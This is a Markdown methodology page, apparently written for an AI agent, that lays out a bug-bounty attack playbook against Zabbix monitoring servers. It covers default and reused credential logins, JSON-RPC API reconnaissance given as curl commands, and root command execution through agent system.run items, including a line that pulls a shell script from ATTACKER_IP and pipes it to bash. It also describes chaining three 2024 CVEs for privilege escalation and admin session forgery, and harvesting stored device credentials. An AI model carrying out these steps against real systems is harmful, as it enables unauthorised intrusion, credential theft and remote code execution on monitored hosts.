---
technology: "Zabbix"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
role: implementation-variant
layer: monitoring server + web frontend + agent (10051 trapper, 10050 agent, HTTP frontend)
homepage: "https://www.zabbix.com"
status: confirmed
provenance: "corpus-grounded (strict gate 2026-11-12: 4 writeup files with Zabbix command-context evidence — guest/API footholds, agent system.run execution, API SQLi chains; evidence classes in internal coverage ledger) + upstream-verified (Zabbix support tracker ZBX-25614 CVE-2024-36467, ZBX-25623 CVE-2024-42327, ZBX-24505 CVE-2024-22120, zabbix.com container images). Companion area router: [[monitoring|Monitoring platforms]]. Enrichment pass 2 new-unit wave A, 2026-11-12."
---

# Zabbix — implementation methodology

Companion router: [[monitoring|Monitoring platforms area router]] (dispatch table, the
credential-reuse-into-RCE pattern shared by all monitors). This page covers Zabbix
specifically: the JSON-RPC API, the frontend's auth quirks, the agent's command
items, and the version-gated SQL injection chain.

Target model: Zabbix frontend on HTTP(S) (root or under `/zabbix`), server trapper on
10051, agents on 10050, API at `api_jsonrpc.php`. Version disclosed in the frontend
footer ("© … Zabbix SIA") — read it first.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Guest login enabled | "Sign in as guest" on login page | yes | Read-only recon, sometimes API access |
| API `user.login` | any valid credential (reused fleet-wide) | creds | Full console/API — High |
| Agent `system.run` items | port 10050 reachable + EnableRemoteCommands (or console write access) | if items exist | Command execution as the agent (root) — Critical |
| CVE-2024-22120 audit-log SQLi | server < 6.0.28 / 6.4.13 / 7.0.0beta2 | post-auth (API access) | Time-based blind SQLi → admin session forgery |
| CVE-2024-36467 user.update | frontend ≤ 5.0.42/6.0.32/6.4.17/7.0.1 | any API user (default User role) | Self-escalation to Administrators group |
| CVE-2024-42327 user.get SQLi | frontend < 6.0.32 / 6.4.17 / 7.0.1 | any API user | SQLi → password/session theft, admin |
| Global scripts / hosts editor | console admin | post-auth | Script execution on monitored hosts |

## Phase 0 — Fingerprint and version gate

```bash
nmap -sV -p 80,443,10050,10051 198.51.100.10
# 10050/tcp open zabbix-agent   10051/tcp open zabbix-trapper  <- platform confirmed
# frontend footer: "Zabbix 7.0.0alpha1. (c) 2001-2023, Zabbix SIA"  <- version gift
```

Record the exact version string — the three SQLi/authorization CVEs below have narrow
fix bands, and alpha/beta builds (which appear in the wild) sit inside them.

## Phase 1 — Guest and default access

- The login page offers **"Sign in as guest"** when the guest user is enabled (a
  deployment choice; common on forgotten installs). Guest gets a dashboard — and the
  dashboard content is recon: host names, visible problem text, sometimes a username
  worth attacking (one observed deployment's guest dashboard referenced a local user
  that cracked open the whole box).
- Default pair `Admin:zabbix` — try it, then replay every credential harvested on the
  estate (BMC/IPMI hashes, SNMP strings, database dumps). Monitoring consoles are
  credential-reuse sinks; this is the dominant entry in the observed record.

## Phase 2 — The JSON-RPC API

Everything the frontend does goes through `api_jsonrpc.php`. Shape:

```bash
curl -s http://198.51.100.10/zabbix/api_jsonrpc.php \
  -H 'Content-Type: application/json-rpc' \
  -d '{"jsonrpc":"2.0","method":"user.login","params":
       {"username":"svc_account","password":"reused-password"},"id":1}'
# -> {"jsonrpc":"2.0","result":"<auth-token>","id":1}

curl -s http://198.51.100.10/zabbix/api_jsonrpc.php \
  -H 'Content-Type: application/json-rpc' \
  -d '{"jsonrpc":"2.0","method":"host.get","params":{"output":"extend"},
       "auth":"<auth-token>","id":1}'
# hosts + interfaces = the monitored estate map
```

Useful calls in order: `apiinfo.version` (no auth — version even when the footer is
scrubbed), `user.login`, `host.get`, `user.get`, `script.get`, then the write calls
(`script.create`, `host.update`) once privileged.

## Phase 3 — Code execution through the agent

Zabbix agents execute `system.run[command]` items when remote commands are enabled
(or when you can create items as a console user). Two observed paths:

- **From the console** (privileged or after the escalations below): Configuration →
  Hosts → pick a host → create an item of type "Zabbix agent" with key
  `system.run[curl ATTACKER_IP/shell.sh|bash,nowait]`. The server pushes it; the
  agent (running as root) executes it. `nowait` fits the item model without waiting
  on output.
- **Direct to a reachable agent** (no console in the path): with the agent port
  open to you and command items permitted, agent-protocol clients can request
  execution directly. Fetch metadata first (`agent.hostname`, `system.uname`) to
  confirm the listener answers you.

Also audit existing **global scripts** (Administration → Scripts) — deployments leave
"run this on host" entries with weak path discipline; relative paths in privileged
scripts are a classic compose-with-write-access bug.

## Phase 4 — Version-gated SQLi / authz chain (2024 trio, upstream-verified)

All three are reachable from a low-privilege API account (default "User" role has API
access) — and one observed target shipped an alpha build squarely inside every band.

- **CVE-2024-36467** (ZBX-25614; fixed 5.0.43rc1 / 6.0.33rc1 / 6.4.18rc1 / 7.0.2rc1):
  missing authorization checks in the API's user-group handling — an authenticated
  user with access to `user.update` can **add themselves to any group, including
  Zabbix Administrators** (except disabled/front-end-restricted groups). One call,
  low-privilege to admin.
- **CVE-2024-42327** (ZBX-25623; fixed 6.0.32rc1 / 6.4.17rc1 / 7.0.1rc1): SQL
  injection in the `CUser` class (`addRelatedObjects`, reached from `user.get`) —
  available to *every* user with API access. Use it to read the admin password hash
  or session material and take the front end.
- **CVE-2024-22120** (ZBX-24505; fixed 6.0.28rc1 / 6.4.13rc1 / 7.0.0beta2): the
  **server's** audit log does not sanitize the `clientip` field after script
  execution — time-based blind SQL injection. Public exploits extract the admin
  `session_id` + `session_key` and forge a valid `zbx_session` cookie directly,
  skipping passwords entirely. Requires a way to trigger a script execution whose
  client IP you control.

Chain shape that works when several apply: low-priv API login → 36467 self-elevation
→ admin console → Phase 3 execution. With 22120 instead: trigger script → blind SQLi
→ forged admin session → Phase 3.

## Phase 5 — Post-console reads

The console's configuration is the estate's credential list: host inventories, macro
values (`{$USER}`, `{$PASS}`-style user macros frequently hold cleartext logins for
monitored devices), and the database behind the frontend. Treat every macro as a
reusable credential for the machine it targets.

## Command quick reference

```bash
# API version without auth
curl -s http://198.51.100.10/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' \
  -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}'
# agent metadata straight to a reachable agent (zabbix_get)
zabbix_get -s 198.51.100.10 -p 10050 -k agent.hostname
# session cookie to steal after CVE-2024-22120: zbx_session (signed session JSON)
```

## Tool mapping (prose)

curl for raw JSON-RPC calls; zabbix_get and zabbix_sender from the Zabbix agent
distribution for direct agent chatter; nmap for the 10050/10051 service split;
metasploit and public exploit repositories carry packaged versions of the 2024 SQLi
chain. Password testing with patator-style online brute force against the login form
works but is noisy — prefer harvested-credential replay. Tools vault owns per-tool
detail.
